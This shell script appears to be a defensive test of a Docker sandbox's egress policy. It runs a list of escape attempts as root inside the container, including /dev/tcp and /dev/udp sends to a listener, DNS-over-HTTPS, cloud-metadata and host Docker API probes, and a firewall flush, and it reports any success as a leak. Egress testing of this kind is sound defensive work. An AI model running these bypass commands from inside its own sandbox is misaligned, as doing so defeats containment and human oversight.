#!/bin/sh
# Tries to get around a sandbox's network policy as root inside it. Run on the Docker host after giving the sandbox
# a deny-by-default policy that allows only github.com:
#   scripts/egress_bypass.sh <sandbox container> <listener address>
# Listen on a machine you control first (`nc -lk 9998` and `nc -luk 9999`): it must receive nothing.
# Exits 1 if any attempt got through.
set -u
box="$1"
listener="$2"
failed=0
try() {
    name="$1"
    shift
    if docker exec -u root "$box" sh -c "$*" >/dev/null 2>&1; then
        echo "LEAK  $name"
        failed=1
    else
        echo "ok    $name"
    fi
}
ip=$(getent ahostsv4 example.com | awk 'NR==1 {print $1}')
try "denied name over TLS" "curl -sf -m 10 https://example.com"
try "denied name over HTTP" "curl -sf -m 10 http://example.com"
try "denied name pinned to its address" "curl -sf -m 10 --resolve example.com:443:$ip https://example.com"
try "bare address, no server name" "curl -skf -m 10 https://$ip"
try "allowed Host header to a denied address" "curl -sf -m 10 -H 'Host: github.com' http://$ip/ | grep -qi 'example domain'"
try "DNS over HTTPS" "curl -sf -m 10 --doh-url https://1.1.1.1/dns-query https://example.com"
try "outside resolver" "getent ahostsv4 example.com"
try "TCP to the listener" "echo leak | timeout 5 bash -c 'cat > /dev/tcp/$listener/9998'"
# UDP can't fail visibly from inside: the listener on port 9999 must not print "leak"
docker exec -u root "$box" bash -c "echo leak > /dev/udp/$listener/9999" 2>/dev/null
echo "sent  UDP to $listener:9999 (the listener must show nothing)"
try "ICMP" "ping -c 1 -W 3 $listener"
try "IPv6" "curl -6 -sf -m 10 https://github.com"
try "cloud metadata" "curl -sf -m 5 http://169.254.169.254/"
try "the host's Docker API" "curl -sf -m 5 http://\$(ip route | awk '/default/ {print \$3}'):2375/version"
try "the host's SSH" "timeout 5 bash -c 'echo > /dev/tcp/'\$(ip route | awk '/default/ {print \$3}')'/22'"
try "change own address" "ip addr add 10.99.0.2/24 dev eth0"
try "flush firewall" "nft flush ruleset"
try "raw socket" "python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)'"
if docker exec -u root "$box" sh -c "curl -sf -m 10 -o /dev/null https://github.com"; then
    echo "ok    allowed name still works"
else
    echo "FAIL  allowed name is blocked"
    failed=1
fi
exit $failed
